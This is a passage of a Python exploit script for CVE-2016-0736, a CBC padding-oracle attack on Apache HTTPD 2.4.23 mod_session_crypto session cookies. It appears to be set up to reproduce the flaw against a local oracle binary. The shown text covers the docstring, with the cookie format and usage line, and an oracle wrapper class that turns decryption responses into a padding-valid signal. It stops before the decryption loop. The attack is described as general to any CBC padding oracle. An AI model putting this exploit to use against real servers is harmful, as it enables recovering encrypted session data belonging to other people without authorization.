#!/usr/bin/env python3
"""
Padding-oracle exploit (Vaudenay) for the Apache HTTPD 2.4.23 mod_session_crypto
CVE-2016-0736 reproduction. Identical to the DFAIL exploit; any CBC padding-oracle
can be attacked this way.

Invoked as: python3 exploit.py <oracle_path> <key> <cookie>
Cookie = base64(salt[16] || IV[16] || ciphertext). Recovers the plaintext without the key.
Prints ONLY the recovered plaintext to stdout.
"""
import sys
import json
import base64
import subprocess

BLOCK = 16


class Oracle:
    def __init__(self, oracle_path, key):
        self.oracle_path = oracle_path
        self.key = key

    def __call__(self, prev, block):
        cookie = base64.b64encode(bytes(prev) + bytes(block)).decode()
        r = subprocess.run(
            [self.oracle_path, "decrypt", cookie, self.key], capture_output=True, text=True,
        )
        try:
            resp = json.loads(r.stdout)
        except json.JSONDecodeError:
            return False
        return bool(resp.get("plaintext_b64", ""))   # non-empty => padding VALID


